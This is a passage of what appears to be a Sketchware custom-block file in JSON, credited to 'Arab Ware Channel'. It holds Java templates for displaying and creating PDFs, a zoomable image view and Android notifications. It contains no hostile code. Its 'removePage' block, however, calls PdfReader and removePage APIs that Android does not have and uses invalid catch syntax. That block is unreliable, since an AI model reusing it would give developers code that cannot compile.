android.graphics.pdf.PdfDocument.Page %1$spage;\nprivate java.io.File %1$sFile;\n{","color":"#FF00BFA5","name":"PDF LIBEARY BLOCK","typeName":"","palette":"140","type":" ","spec":"put me in more block %m.PdfDocument"},{"code":"","color":"#FF00BFA5","name":"pdf reader blocks","typeName":"","palette":"140","type":"h","spec":"pdf reader blocks | pdf بلوكات قراءة "},{"code":"","color":"#FF00BFA5","name":"FROM PATH","typeName":"","palette":"140","type":"h","spec":"FROM PATH ? | من مسار ؟"},{"code":"try {\n%1$sPR \u003d new android.graphics.pdf.PdfRenderer(new ParcelFileDescriptor(ParcelFileDescriptor.open(new java.io.File(%2$s), ParcelFileDescriptor.MODE_READ_ONLY)));\n%3$s\n} catch (Exception e){\n%4$s\n}","color":"#FF00BFA5","typeName":"","name":"try get data","palette":"140","type":"e","spec":"%m.PdfDocument get data from path %s","spec2":"if there is error then"},{"code":"","color":"#FF00BFA5","name":"FROM ASSET","typeName":"","palette":"140","type":"h","spec":"FROM ASSET ? |قراءة  من داخل تطبيقك"},{"code":"%1$sFE \u003d new java.io.File(getCacheDir(), %2$s);\nif (!%1$sFE.exists()) {\ntry {\n%1$sasset \u003d getAssets().open(%2$s); \n%1$soutput \u003d null;\n%1$soutput \u003d new java.io.FileOutputStream(%1$sFE);\n%1$sbuffer \u003d new byte[1024];\nwhile ((%1$sPsize \u003d %1$sasset.read(%1$sbuffer)) !\u003d -1) {\n%1$soutput.write(%1$sbuffer, 0, %1$sPsize);\n}\n%1$sasset.close();\n%1$soutput.close();\n} catch (java.io.IOException e) {\n}\n}\r\ntry {\n\t%1$sPR \u003d new android.graphics.pdf.PdfRenderer(new ParcelFileDescriptor(ParcelFileDescriptor.open(new java.io.File(%1$sFE.getAbsolutePath()), ParcelFileDescriptor.MODE_READ_ONLY)));\n%3$s\n} catch (Exception e){\n\t %4$s\n}","color":"#FF00BFA5","typeName":"","name":"Try Display Pdf. .......","palette":"140","type":"e","spec":"%m.PdfDocument get data from asset with path %s","spec2":"if there is error then"},{"code":"","color":"#FF00BFA5","name":"starting blocks","typeName":"","palette":"140","type":"h","spec":"starting reading blocks |  بلوكات بدء القراءة "},{"code":"%1$sRpage \u003d %1$sPR.openPage((int)%2$s);\n\n%1$smBitmap \u003d Bitmap.createBitmap((int)getDip(%1$sRpage.getWidth()), (int)getDip(%1$sRpage.getHeight()), Bitmap.Config.ARGB_8888);\n\n%1$sRpage.render(%1$smBitmap, null, null, android.graphics.pdf.PdfRenderer.Page.RENDER_MODE_FOR_DISPLAY);\n\n%1$stouch.setImageBitmap(%1$smBitmap);\n\n%1$sRpage.close();","color":"#FF00BFA5","name":"set page ..","typeName":"","palette":"140","type":" ","spec":"%m.PdfDocument show page %d"},{"code":"%1$stouch \u003d new\nZoomableImageView(%3$s.this);\n%2$s.addView(%1$stouch);","color":"#FF00BFA5","name":"show in ?","typeName":"","palette":"140","type":" ","spec":"%m.PdfDocument show pdf in %m.view in %m.activity"},{"code":"%1$sPR.getPageCount()","color":"#FF00BFA5","name":"Get Total Pages....","typeName":"","palette":"140","type":"d","spec":"%m.PdfDocument get total pdf file pages"},{"code":"%2$sRpage \u003d %2$sPR.openPage((int)%3$s);\n\n%2$smBitmap \u003d Bitmap.createBitmap((int)getDip(%2$sRpage.getWidth()), (int)getDip(%2$sRpage.getHeight()), Bitmap.Config.ARGB_8888);\n\n%2$sRpage.render(%2$smBitmap, null, null, android.graphics.pdf.PdfRenderer.Page.RENDER_MODE_FOR_DISPLAY);\n\n%1$s.setImageBitmap(%2$smBitmap);\n\n%2$sRpage.close();","color":"#FF00BFA5","name":"extra blocks","typeName":"","palette":"140","type":" ","spec":"%m.imageview set image as %m.PdfDocument page %d"},{"code":"","color":"#FF00BFA5","name":"pdf creator","typeName":"","palette":"140","type":"h","spec":"pdf creator blocks | pdf بلوكات صناعة"},{"code":"%1$s \u003d new android.graphics.pdf.PdfDocument();","color":"#FF00BFA5","name":"create new pdf creator..","typeName":"","palette":"140","type":" ","spec":"%m.PdfDocument create new one"},{"code":"%1$sbit \u003d BitmapFactory.decodeFile(%2$s);\r\n\t%1$swidth \u003d %1$sbit.getWidth();\n\t%1$sheight \u003d %1$sbit.getHeight();\n\t%1$smaxSize \u003d 1100;\n\t%1$sbitmapRatio \u003d (float)%1$swidth / (float)%1$sheight;\r\n\tif (%1$sbitmapRatio \u003e 1) {\n\t\t%1$swidth \u003d %1$smaxSize;\n\t\t%1$sheight \u003d (int)(%1$swidth / %1$sbitmapRatio);\n\t} else {\n\t\t%1$sheight \u003d %1$smaxSize;\n%1$swidth \u003d (int)(%1$sheight * %1$sbitmapRatio);\n\t}\r\n\t%1$sbitmap \u003d Bitmap.createScaledBitmap(%1$sbit, %1$swidth, %1$sheight, true);\r\n\t%1$smyPageInfo \u003d new android.graphics.pdf.PdfDocument.PageInfo.Builder(%1$sbitmap.getWidth(),%1$sbitmap.getHeight(),1).create();\r\n\t%1$spage \u003d %1$s.startPage(%1$smyPageInfo);\r\n\t%1$spage.getCanvas().drawBitmap(%1$sbitmap,0,0, null);\n\t%1$s.finishPage(%1$spage);","color":"#FF00BFA5","name":"AddPage....","typeName":"","palette":"140","type":" ","spec":"add page to %m.PdfDocument from image path %s"},{"code":"%1$sFile \u003d new java.io.File(%2$s);\r\ntry {\n\t%1$s.writeTo(new java.io.FileOutputStream(%1$sFile));\n} catch (java.io.IOException e) {\r\n}\n%1$s.close();","color":"#FF00BFA5","name":"SavePdf....","typeName":"","palette":"140","type":" ","spec":"%m.PdfDocument save to path %s"},{"code":"try {\nnew android.graphics.pdf.PdfDocument(new android.graphics.pdf.PdfReader(%2$s)).removePage(%1$s).writeTo(new java.io.FileOutputStream(new java.io.File(%2$s))).close();\n} catch(java.io.IOException) {\n}","color":"#FF00BFA5","name":"removePage","typeName":"","palette":"140","type":" ","spec":"remove page %d from pdf file path %s"},{"code":"","color":"#FF000000","name":"created by Arab.","typeName":"","palette":"140","type":"h","spec":"Created By Arab Ware Channel"},{"code":"}\nprivate\nandroid.graphics.pdf.PdfRenderer\nrenderer;\nZoomableImageView touch;\r\npublic class ZoomableImageView extends ImageView {\n\n\nMatrix matrix \u003d new Matrix();\n\nstatic final int NONE \u003d 0;\n\nstatic final int DRAG \u003d 1;\n\nstatic final int ZOOM \u003d 2;\n\nstatic final int CLICK \u003d 3;\n\nint mode \u003d NONE;\n\nPointF last \u003d new PointF();\n\nPointF start \u003d new PointF();\n\nfloat minScale \u003d 1f;\n\nfloat maxScale \u003d 4f;\n\nfloat[] m;\n\nfloat redundantXSpace, redundantYSpace;\n\nfloat width, height;\n\nfloat saveScale \u003d 1f;\n\nfloat right, bottom, origWidth, origHeight, bmWidth, bmHeight;\n\nScaleGestureDetector mScaleDetector;\n\nContext context;\n\n\npublic ZoomableImageView(Context context) {\n\nsuper(context);\n\nsuper.setClickable(true);\n\nthis.context \u003d context;\n\nmScaleDetector \u003d new ScaleGestureDetector(context, new ScaleListener());\n\nmatrix.setTranslate(1f, 1f);\n\nm \u003d new float[9];\n\nsetImageMatrix(matrix); setScaleType(ScaleType.MATRIX);\n\n\nsetOnTouchListener(new OnTouchListener() {\n\n@Override\n\npublic boolean onTouch(View v, MotionEvent event) {\n\nmScaleDetector.onTouchEvent(event);\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nPointF curr \u003d new PointF(event.getX(), event.getY());\n\nswitch (event.getAction()) {\n\ncase MotionEvent.ACTION_DOWN: last.set(event.getX(), event.getY()); start.set(last); mode \u003d DRAG;\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_DOWN: last.set(event.getX(), event.getY()); start.set(last);\n\nmode \u003d ZOOM;\n\nbreak;\n\ncase MotionEvent.ACTION_MOVE:\n\nif (mode \u003d\u003d ZOOM || (mode \u003d\u003d DRAG \u0026\u0026 saveScale \u003e minScale)) {\n\nfloat deltaX \u003d curr.x - last.x;\n\nfloat deltaY \u003d curr.y - last.y;\n\nfloat scaleWidth \u003d Math.round(origWidth * saveScale);\n\nfloat scaleHeight \u003d Math.round(origHeight * saveScale);\n\nif (scaleWidth \u003c width) {\n\ndeltaX \u003d 0;\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n} else if (scaleHeight \u003c height) {\n\ndeltaY \u003d 0;\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\n} else {\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n}\n\nmatrix.postTranslate(deltaX, deltaY);\n\nlast.set(curr.x, curr.y);\n\n}\n\nbreak;\n\ncase MotionEvent.ACTION_UP:\n\nmode \u003d NONE;\n\nint xDiff \u003d (int) Math.abs(curr.x - start.x);\n\nint yDiff \u003d (int) Math.abs(curr.y - start.y);\n\nif (xDiff \u003c CLICK \u0026\u0026 yDiff \u003c CLICK) performClick();\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_UP:\n\nmode \u003d NONE;\n\nbreak;\n\n}\n\nsetImageMatrix(matrix);\n\ninvalidate();\n\nreturn true;\n\n}\n\n});\n\n}\n\n\n@Override\n\npublic void setImageBitmap(Bitmap bm) {\n\nsuper.setImageBitmap(bm);\n\nbmWidth \u003d bm.getWidth();\n\nbmHeight \u003d bm.getHeight(); }\n\n\npublic void setMaxZoom(float x) {\n\nmaxScale \u003d x; }\n\n\nprivate class ScaleListener extends ScaleGestureDetector.SimpleOnScaleGestureListener {\n\n@Override\n\npublic boolean onScaleBegin(ScaleGestureDetector detector) {\n\nmode \u003d ZOOM;\n\nreturn true;}\n\n@Override\n\npublic boolean onScale(ScaleGestureDetector detector) {\n\nfloat mScaleFactor \u003d detector.getScaleFactor();\n\nfloat origScale \u003d saveScale;\n\nsaveScale *\u003d mScaleFactor;\n\nif (saveScale \u003e maxScale){\n\nsaveScale \u003d maxScale;\n\nmScaleFactor \u003d maxScale / origScale;\n\n} else if (saveScale \u003c minScale) {\n\nsaveScale \u003d minScale;\n\nmScaleFactor \u003d minScale / origScale;}\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale);\n\nif (origWidth * saveScale \u003c\u003d width || origHeight * saveScale \u003c\u003d height) {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, width / 2, height / 2);\n\nif (mScaleFactor \u003c 1) {\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (Math.round(origWidth * saveScale) \u003c width) {\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);\n\n} else {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);}\n\n}\n\n}\n\n} else {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, detector.getFocusX(), detector.getFocusY()); matrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);}\n\n}\n\nreturn true;\n\n}\n\n}\n\n\n@Override\n\nprotected void onMeasure (int widthMeasureSpec, int heightMeasureSpec) {\n\nsuper.onMeasure(widthMeasureSpec, heightMeasureSpec);\n\nwidth \u003d MeasureSpec.getSize(widthMeasureSpec);\n\nheight \u003d MeasureSpec.getSize(heightMeasureSpec);\n\nfloat scale;\n\nfloat scaleX \u003d width / bmWidth;\n\nfloat scaleY \u003d height / bmHeight;\n\nscale \u003d Math.min(scaleX, scaleY); matrix.setScale(scale, scale); setImageMatrix(matrix);\n\nsaveScale \u003d 1f;\n\nredundantYSpace \u003d height - (scale * bmHeight) ;\n\nredundantXSpace \u003d width - (scale * bmWidth);\n\nredundantYSpace /\u003d 2;\n\nredundantXSpace /\u003d 2; matrix.postTranslate(redundantXSpace, redundantYSpace);\n\norigWidth \u003d width - 2 * redundantXSpace;\n\norigHeight \u003d height - 2 * redundantYSpace;\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale); setImageMatrix(matrix);}\n\n}\n\n    \r\n{","color":"#FF000000","name":"pdf library.","typeName":"","palette":"140","type":" ","spec":"pdf library | in more block |"},{"code":"android.graphics.pdf.PdfRenderer.Page page \u003d renderer.openPage((int)%1$s);\n\nBitmap mBitmap \u003d Bitmap.createBitmap((int)getDip(page.getWidth()), (int)getDip(page.getHeight()), Bitmap.Config.ARGB_8888);\n\npage.render(mBitmap, null, null, android.graphics.pdf.PdfRenderer.Page.RENDER_MODE_FOR_DISPLAY);\n\ntouch.setImageBitmap(mBitmap);\n\npage.close();","color":"#FF000000","name":"Display PDF With Page.","typeName":"","palette":"140","type":" ","spec":"display pdf file with page %d"},{"code":"File file \u003d new File(getCacheDir(), %1$s); if (!file.exists()) { try { InputStream asset \u003d getAssets().open(%1$s); FileOutputStream output \u003d null; output \u003d new FileOutputStream(file); final byte[] buffer \u003d new byte[1024]; int size; while ((size \u003d asset.read(buffer)) !\u003d -1) { output.write(buffer, 0, size); } asset.close(); output.close(); } catch (IOException e) { e.printStackTrace(); } }\r\ntry {\n\trenderer \u003d new android.graphics.pdf.PdfRenderer(new ParcelFileDescriptor(ParcelFileDescriptor.open(new java.io.File(file.getAbsolutePath()), ParcelFileDescriptor.MODE_READ_ONLY)));\n%2$s\n} catch (Exception e){\n\t %3$s\n}","color":"#FF000000","typeName":"","name":"Try Display Pdf.","palette":"140","type":"e","spec":"Try Display Pdf from assets %s","spec2":"if there is error then"},{"code":"touch \u003d new\nZoomableImageView(%2$s.this);\n%1$s.addView(touch);","color":"#FF000000","name":"Display Pdf Into.","typeName":"","palette":"140","type":" ","spec":"Display Pdf Into %m.view %m.activity"},{"code":"renderer.getPageCount()","color":"#FF000000","name":"Get Total Pages.","typeName":"","palette":"140","type":"d","spec":"get total pdf file pages"},{"code":"","color":"#FFC2185B","name":"ArabWare    ","typeName":"","palette":"140","type":"h","spec":"This By Arab Ware Channel Dont Dont Dont Edit it هذا بواسطة قناة عرب وير بواسطة امير عزت اياك و تعديله"},{"code":"}\nprivate\nandroid.graphics.pdf.PdfRenderer\nrenderer;\nZoomableImageView touch;\r\npublic class ZoomableImageView extends ImageView {\n\n\nMatrix matrix \u003d new Matrix();\n\nstatic final int NONE \u003d 0;\n\nstatic final int DRAG \u003d 1;\n\nstatic final int ZOOM \u003d 2;\n\nstatic final int CLICK \u003d 3;\n\nint mode \u003d NONE;\n\nPointF last \u003d new PointF();\n\nPointF start \u003d new PointF();\n\nfloat minScale \u003d 1f;\n\nfloat maxScale \u003d 4f;\n\nfloat[] m;\n\nfloat redundantXSpace, redundantYSpace;\n\nfloat width, height;\n\nfloat saveScale \u003d 1f;\n\nfloat right, bottom, origWidth, origHeight, bmWidth, bmHeight;\n\nScaleGestureDetector mScaleDetector;\n\nContext context;\n\n\npublic ZoomableImageView(Context context) {\n\nsuper(context);\n\nsuper.setClickable(true);\n\nthis.context \u003d context;\n\nmScaleDetector \u003d new ScaleGestureDetector(context, new ScaleListener());\n\nmatrix.setTranslate(1f, 1f);\n\nm \u003d new float[9];\n\nsetImageMatrix(matrix); setScaleType(ScaleType.MATRIX);\n\n\nsetOnTouchListener(new OnTouchListener() {\n\n@Override\n\npublic boolean onTouch(View v, MotionEvent event) {\n\nmScaleDetector.onTouchEvent(event);\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nPointF curr \u003d new PointF(event.getX(), event.getY());\n\nswitch (event.getAction()) {\n\ncase MotionEvent.ACTION_DOWN: last.set(event.getX(), event.getY()); start.set(last); mode \u003d DRAG;\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_DOWN: last.set(event.getX(), event.getY()); start.set(last);\n\nmode \u003d ZOOM;\n\nbreak;\n\ncase MotionEvent.ACTION_MOVE:\n\nif (mode \u003d\u003d ZOOM || (mode \u003d\u003d DRAG \u0026\u0026 saveScale \u003e minScale)) {\n\nfloat deltaX \u003d curr.x - last.x;\n\nfloat deltaY \u003d curr.y - last.y;\n\nfloat scaleWidth \u003d Math.round(origWidth * saveScale);\n\nfloat scaleHeight \u003d Math.round(origHeight * saveScale);\n\nif (scaleWidth \u003c width) {\n\ndeltaX \u003d 0;\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n} else if (scaleHeight \u003c height) {\n\ndeltaY \u003d 0;\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\n} else {\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n}\n\nmatrix.postTranslate(deltaX, deltaY);\n\nlast.set(curr.x, curr.y);\n\n}\n\nbreak;\n\ncase MotionEvent.ACTION_UP:\n\nmode \u003d NONE;\n\nint xDiff \u003d (int) Math.abs(curr.x - start.x);\n\nint yDiff \u003d (int) Math.abs(curr.y - start.y);\n\nif (xDiff \u003c CLICK \u0026\u0026 yDiff \u003c CLICK) performClick();\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_UP:\n\nmode \u003d NONE;\n\nbreak;\n\n}\n\nsetImageMatrix(matrix);\n\ninvalidate();\n\nreturn true;\n\n}\n\n});\n\n}\n\n\n@Override\n\npublic void setImageBitmap(Bitmap bm) {\n\nsuper.setImageBitmap(bm);\n\nbmWidth \u003d bm.getWidth();\n\nbmHeight \u003d bm.getHeight(); }\n\n\npublic void setMaxZoom(float x) {\n\nmaxScale \u003d x; }\n\n\nprivate class ScaleListener extends ScaleGestureDetector.SimpleOnScaleGestureListener {\n\n@Override\n\npublic boolean onScaleBegin(ScaleGestureDetector detector) {\n\nmode \u003d ZOOM;\n\nreturn true;}\n\n@Override\n\npublic boolean onScale(ScaleGestureDetector detector) {\n\nfloat mScaleFactor \u003d detector.getScaleFactor();\n\nfloat origScale \u003d saveScale;\n\nsaveScale *\u003d mScaleFactor;\n\nif (saveScale \u003e maxScale){\n\nsaveScale \u003d maxScale;\n\nmScaleFactor \u003d maxScale / origScale;\n\n} else if (saveScale \u003c minScale) {\n\nsaveScale \u003d minScale;\n\nmScaleFactor \u003d minScale / origScale;}\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale);\n\nif (origWidth * saveScale \u003c\u003d width || origHeight * saveScale \u003c\u003d height) {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, width / 2, height / 2);\n\nif (mScaleFactor \u003c 1) {\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (Math.round(origWidth * saveScale) \u003c width) {\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);\n\n} else {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);}\n\n}\n\n}\n\n} else {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, detector.getFocusX(), detector.getFocusY()); matrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);}\n\n}\n\nreturn true;\n\n}\n\n}\n\n\n@Override\n\nprotected void onMeasure (int widthMeasureSpec, int heightMeasureSpec) {\n\nsuper.onMeasure(widthMeasureSpec, heightMeasureSpec);\n\nwidth \u003d MeasureSpec.getSize(widthMeasureSpec);\n\nheight \u003d MeasureSpec.getSize(heightMeasureSpec);\n\nfloat scale;\n\nfloat scaleX \u003d width / bmWidth;\n\nfloat scaleY \u003d height / bmHeight;\n\nscale \u003d Math.min(scaleX, scaleY); matrix.setScale(scale, scale); setImageMatrix(matrix);\n\nsaveScale \u003d 1f;\n\nredundantYSpace \u003d height - (scale * bmHeight) ;\n\nredundantXSpace \u003d width - (scale * bmWidth);\n\nredundantYSpace /\u003d 2;\n\nredundantXSpace /\u003d 2; matrix.postTranslate(redundantXSpace, redundantYSpace);\n\norigWidth \u003d width - 2 * redundantXSpace;\n\norigHeight \u003d height - 2 * redundantYSpace;\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale); setImageMatrix(matrix);}\n\n}\n\n    \r\n{","color":"#FFC2185B","name":"pdf library","typeName":"","palette":"140","type":" ","spec":"pdf library | in more block |"},{"code":"","color":"#FFC2185B","name":"Something Needs Storage permission or another  arab ware","typeName":"","palette":"140","type":"h","spec":"Something Needs Storage permission or another"},{"code":"android.graphics.pdf.PdfRenderer.Page page \u003d renderer.openPage((int)%1$s);\n\nBitmap mBitmap \u003d Bitmap.createBitmap((int)getDip(page.getWidth()), (int)getDip(page.getHeight()), Bitmap.Config.ARGB_8888);\n\npage.render(mBitmap, null, null, android.graphics.pdf.PdfRenderer.Page.RENDER_MODE_FOR_DISPLAY);\n\ntouch.setImageBitmap(mBitmap);\n\npage.close();","color":"#FFC2185B","name":"Display PDF With Page","typeName":"","palette":"140","type":" ","spec":"display pdf file with page %d"},{"code":"try {\nrenderer \u003d new android.graphics.pdf.PdfRenderer(new ParcelFileDescriptor(ParcelFileDescriptor.open(new java.io.File(%s), ParcelFileDescriptor.MODE_READ_ONLY)));\n%s\n} catch (Exception e){\n%s\n}","color":"#FFC2185B","typeName":"","name":"Try Display Pdf","palette":"140","type":"e","spec":"Try Display Pdf from path %s","spec2":"if there is error then"},{"code":"touch \u003d new\nZoomableImageView(%2$s.this);\n%1$s.addView(touch);","color":"#FFC2185B","name":"Display Pdf Into","typeName":"","palette":"140","type":" ","spec":"Display Pdf Into %m.view %m.activity"},{"code":"renderer.getPageCount()","color":"#FFC2185B","name":"Get Total Pages","typeName":"","palette":"140","type":"d","spec":"get total pdf file pages"},{"code":"","color":"#FF00C853","name":"Created By Arab Ware Channel ","typeName":"","palette":"154","type":"h","spec":"Created By Arab Ware Channel"},{"code":"Notification.Builder %1$s \u003d new","color":"#FF00C853","name":"set ID ","typeName":"","palette":"154","type":" ","spec":"create new %m.notification "},{"code":"Notification.Builder(%1$s.this);","color":"#FF00C853","name":"make it in ","typeName":"","palette":"154","type":" ","spec":"make the notification in %m.activity"},{"code":"%1$s.setSmallIcon(R.drawable.%2$s);","color":"#FF00C853","name":"set small icon ","typeName":"","palette":"154","type":" ","spec":"set %m.notification icon %m.resource"},{"code":"%1$s.setContentTitle(%2$s);","color":"#FF00C853","name":"set title ","typeName":"","palette":"154","type":" ","spec":"set title of %m.notification with %s"},{"code":"%1$s.setContentText(%2$s);","color":"#FF00C853","name":"set text ","typeName":"","palette":"154","type":" ","spec":"set text of %m.notification with %s"},{"code":"NotificationManager notificationManager \u003d (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);\nIntent %2$sm \u003d new Intent(\ngetApplicationContext(), %1$s.class);\nPendingIntent n%2$s \u003d PendingIntent.getActivity(\ngetApplicationContext(),\n0,\n%2$sm,\nIntent.FLAG_ACTIVITY_NEW_TASK);","color":"#FF00C853","name":"go to activity ","typeName":"","palette":"154","type":" ","spec":"go to activity %m.activity when %m.notification clicked"},{"code":"%1$s.setContentIntent(n%1$s).setAutoCancel(%2$s);","color":"#FF00C853","name":"auto cancel ","typeName":"","palette":"154","type":" ","spec":"set %m.notification auto cancel %b  "},{"code":"%1$s.setOngoing(%2$s);","color":"#FF00C853","name":"set ongoing ","typeName":"","palette":"154","type":" ","spec":"set %m.notification Ongoing %b  "},{"code":"int onx \u003d %1$s;","color":"#FF00C853","name":"set int onx","typeName":"","palette":"154","type":" ","spec":"set int onx %d "},{"code":"notificationManager.notify(onx, %1$s.build());","color":"#FF00C853","name":"start ","typeName":"","palette":"154","type":" ","spec":"start %m.notification "},{"code":"NotificationManager notificationManager \u003d (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE); notificationManager.cancel(%1$s);","color":"#FF00C853","name":"clear notification ","typeName":"","palette":"154","type":" ","spec":"clear %m.notification "},{"code":"","color":"#FF00C853","name":"Big Image Notifications","typeName":"","palette":"154","type":"h","spec":"Big Image Notifications Blocks added by arab ware channel"},{"code":"Notification.Builder %1$s \u003d new Notification.Builder(%2$s.this);","color":"#FF00C853","name":"create big image notification","typeName":"","palette":"154","type":" ","spec":"create big image notification with name %m.notification set it in %m.activity"},{"code":"%2$s.setSmallIcon(R.drawable.%1$s);","color":"#FF00C853","name":"Icon","typeName":"","palette":"154","type":" ","spec":"set icon %m.resource fro big notification %m.notification"},{"code":"Bitmap %2$su \u003d BitmapFactory.decodeResource(getResources(), R.drawable.%1$s);\n%2$s.setLargeIcon(%2$su); Bitmap %2$sm \u003d BitmapFactory.decodeResource(getResources(), R.drawable.%1$s);\n%2$s.setStyle(new Notification.BigPictureStyle() .bigPicture(%2$sm));","color":"#FF00C853","name":"set big image","typeName":"","palette":"154","type":" ","spec":"set big image %m.resource for %m.notification"},{"code":"%1$s.setContentTitle(%2$s); %1$s.setContentText(%3$s);","color":"#FF00C853","name":"set title and text","typeName":"","palette":"154","type":" ","spec":"big image %m.notification set title %s set text %s "},{"code":"NotificationManager notificationManager \u003d (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);\nIntent %1$sa \u003d new Intent(getApplicationContext(), %2$s.class );\nPendingIntent %1$sb \u003d PendingIntent.getActivity(getApplicationContext(), 0, %1$sa, Intent.FLAG_ACTIVITY_NEW_TASK);","color":"#FF00C853","name":"activity","typeName":"","palette":"154","type":" ","spec":"big image %m.notification open %m.activity when clicked "},{"code":"%1$s.setContentIntent(%1$sb).setAutoCancel(%2$s);","color":"#FF00C853","name":"cancelable","typeName":"","palette":"154","type":" ","spec":"big image %m.notification set cancelable %b "},{"code":"%1$s.setOngoing(%2$s);","color":"#FF00C853","name":"on going","typeName":"","palette":"154","type":" ","spec":"big image %m.notification set on going %b"},{"code":"notificationManager.notify(%2$s, %1$s.build());","color":"#FF00C853","name":"start","typeName":"","palette":"154","type":" ","spec":"start big image %m.notification with type %d "},{"code":"","color":"#FF00C853","name":"custom notification","typeName":"","palette":"154","type":"h","spec":"custom notification added by arab ware channel"},{"code":"RemoteViews Arabware%1$s \u003d new RemoteViews(getPackageName(), R.layout.%2$s);\r\nNotification.Builder %1$s \u003d new Notification.Builder(%3$s.this);","color":"#FF00C853","name":"create custom notification","typeName":"","palette":"154","type":" ","spec":"create custom %m.notification from %m.customViews set up in %m.activity"},{"code":"%2$s.setSmallIcon(R.drawable.%1$s);\r\n%2$s.setContent(Arabware%2$s);","color":"#FF00C853","name":"set icon","typeName":"","palette":"154","type":" ","spec":"set small %m.resource  fro custom %m.notification "},{"code":"NotificationManager notificationManager \u003d (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);\r\nIntent AA%1$s \u003d new Intent(getApplicationContext(),\r\n%2$s.class);\r\nPendingIntent BB%1$s \u003d PendingIntent.getActivity(getApplicationContext(), 0, AA%1$s, Intent.FLAG_ACTIVITY_NEW_TASK);","color":"#FF00C853","name":"when clicked","typeName":"","palette":"154","type":" ","spec":"when custom %m.notification set up %m.activity"},{"code":"%1$s.setContentIntent(BB%1$s).setAutoCancel(%2$s);","color":"#FF00C853","name":"auto","typeName":"","palette":"154","type":" ","spec":"set custom %m.notification cancelable %b"},{"code":"%1$s.setOngoing(%2$s);","color":"#FF00C853","name":"on going custom","typeName":"","palette":"154","type":" ","spec":"set custom %m.notification on going %b"},{"code":"notificationManager.notify(%2$s, %1$s.build());","color":"#FF00C853","name":"start notification","typeName":"","palette":"154","type":" ","spec":"start custom %m.notification with type %d"},{"code":"","color":"#FF00C853","name":"push notifications","typeName":"","palette":"154","type":"h","spec":"push notifications |developed by arab ware channel not created|"},{"code":"\t\t{final Activity activity \u003d %1$s.this;\n\t\tfinal Context context \u003d activity.getApplicationContext();\n\t\tfinal int notificationId \u003d %2$s;\n\t\tfinal String channelId \u003d \"%3$s\";\n\t\tfinal String channelName \u003d \"%4$s\";\n\t\t\n\t\tnew androidx.core.app.NotificationCompat.Builder(context, channelId){\n\t\t\t\n\t\t\t\n\t\t\tNotificationManager notificationManager \u003d (NotificationManager) 